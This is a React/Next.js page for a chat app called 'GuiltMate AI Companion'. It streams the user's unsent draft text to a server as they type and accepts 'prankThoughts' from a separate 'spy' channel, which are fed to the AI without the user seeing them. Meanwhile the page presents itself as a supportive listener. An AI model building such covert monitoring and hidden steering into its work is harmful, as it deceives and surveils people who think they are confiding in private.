"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { useSearchParams } from "next/navigation"
import { io, type Socket } from "socket.io-client"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { useToast } from "@/hooks/use-toast"
import {  Loader2, Send } from "lucide-react"

interface Message {
  id: string
  type: "user" | "ai"
  content: string
  timestamp: string
}

export default function ChatCompanionPage() {
  const searchParams = useSearchParams()
  const code = searchParams.get("code")
  const [socket, setSocket] = useState<Socket | null>(null)
  const [messages, setMessages] = useState<Message[]>([])
  const [input, setInput] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [prankThoughts, setPrankThoughts] = useState("");
  const [isConnected, setIsConnected] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const { toast } = useToast()

  useEffect(() => {
    if (!code) return

    // Replace with your backend Socket.IO URL
    const newSocket = io("https://mindmate-y168.onrender.com/")
    setSocket(newSocket)

    newSocket.on("connect", () => {
      setIsConnected(true)
      newSocket.emit("join-room", { code, userType: "companion" })
    })

    newSocket.on("disconnect", () => {
      setIsConnected(false)
    })

    newSocket.on("update-spy-prompt", ({ code: incomingCode, prankThoughts }) => {
  if (incomingCode === code) {
    setPrankThoughts(prankThoughts); // 👈 Now your LLM input will get updated!
  }
});

    newSocket.on("ai-response", (data) => {
  setMessages((prev) => [
    ...prev,
    {
      id: Date.now().toString(),
      type: "ai",
      content: data.text, // ✅ use correct field name
      timestamp: new Date().toISOString(), // ✅ fallback timestamp
    },
  ])
  setIsLoading(false)
})


    newSocket.on("error", (data) => {
      toast({
        title: "Error",
        description: data.message,
        variant: "destructive",
      })
      setIsLoading(false)
    })

    return () => {
      newSocket.close()
    }
  }, [code, toast])

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }, [messages])

  // Handle typing with debounce
 useEffect(() => {
  if (!socket) return  // ✅ Only check socket, not input

  const timeoutId = setTimeout(() => {
    socket.emit("user-typing", {
      code,
      currentDraft: input,
      isTyping: input.length > 0,
    })
  }, 100)

  return () => clearTimeout(timeoutId)
}, [input, socket, code])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!input.trim() || !socket || isLoading) return

    const userMessage = input.trim()
    setInput("")
    setIsLoading(true)

    // Add user message to chat
    setMessages((prev) => [
      ...prev,
      {
        id: Date.now().toString(),
        type: "user",
        content: userMessage,
        timestamp: new Date().toISOString(),
      },
    ])

    // Send message via socket
    socket.emit("send-message", {
      userSays: userMessage,
      userThinks: prankThoughts, // No prank thoughts from companion side
      code,
    })
  }

  if (!code) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card>
          <CardContent className="p-6">
            <p className="text-red-500">Invalid access. Please enter a valid code.</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-4xl mx-auto">
        <Card className="h-[90vh] flex flex-col">
          <CardHeader className="border-b">
            <CardTitle className="flex items-center justify-between">
              <span>GuiltMate AI Companion</span>
              <div className="flex items-center gap-2">
                <div className={`w-2 h-2 rounded-full ${isConnected ? "bg-green-500" : "bg-red-500"}`} />
                <span className="text-sm text-gray-500">{isConnected ? "Connected" : "Disconnected"}</span>
              </div>
            </CardTitle>
          </CardHeader>

          <CardContent className="flex-1 flex flex-col p-0">
            {/* Messages */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4">
              {messages.length === 0 && (
                <div className="text-center text-gray-500 mt-8">
                  <p>{"Welcome! I'm here to listen and support you."}</p>
                  <p className="text-sm mt-2">{"Share what's on your mind..."}</p>
                </div>
              )}

              {messages.map((message) => (
                <div key={message.id} className={`flex ${message.type === "user" ? "justify-end" : "justify-start"}`}>
                  <div
                    className={`max-w-[70%] p-3 rounded-lg ${
                      message.type === "user" ? "bg-indigo-600 text-white" : "bg-gray-200 text-gray-900"
                    }`}
                  >
                    <p>{message.content}</p>
                    {/* <p className={`text-xs mt-1 ${message.type === "user" ? "text-indigo-200" : "text-gray-500"}`}>
                      {new Date(message.timestamp).toLocaleTimeString()}
                    </p> */}
                  </div>
                </div>
              ))}

              {isLoading && (
                <div className="flex justify-start">
                  <div className="bg-gray-200 text-gray-900 p-3 rounded-lg">
                    <div className="flex items-center gap-2">
                      <Loader2 className="h-4 w-4 animate-spin" />
                      <span>GuiltMate is thinking...</span>
                    </div>
                  </div>
                </div>
              )}

              <div ref={messagesEndRef} />
            </div>

            {/* Input */}
            <div className="border-t p-4">
              <form onSubmit={handleSubmit} className="flex gap-2">
                <Input
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  placeholder="Share your thoughts..."
                  disabled={isLoading || !isConnected}
                  className="flex-1"
                />
                <Button type="submit" disabled={isLoading || !input.trim() || !isConnected} size="icon">
                  {isLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Send className="h-4 w-4" />}
                </Button>
              </form>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
